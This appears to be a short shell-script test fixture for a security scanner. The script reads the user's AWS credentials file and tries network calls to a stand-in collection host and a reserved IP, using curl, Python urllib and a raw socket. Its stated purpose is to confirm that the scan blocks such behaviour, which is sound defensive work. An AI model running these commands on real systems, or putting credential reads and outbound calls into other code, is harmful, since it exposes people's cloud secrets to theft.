#!/bin/sh
# Test fixture for the dynamic admission scan: reads a canary credential and
# tries to reach the network. It must be blocked for both reasons.
cat "$HOME/.aws/credentials"
if command -v curl >/dev/null 2>&1; then
  curl -s -m 5 http://exfil.example.net/collect || true
else
  python3 -c 'import urllib.request; urllib.request.urlopen("http://exfil.example.net/collect", timeout=5)' || true
fi
python3 -c 'import socket; s = socket.socket(); s.settimeout(5); s.connect(("203.0.113.7", 443))' || true
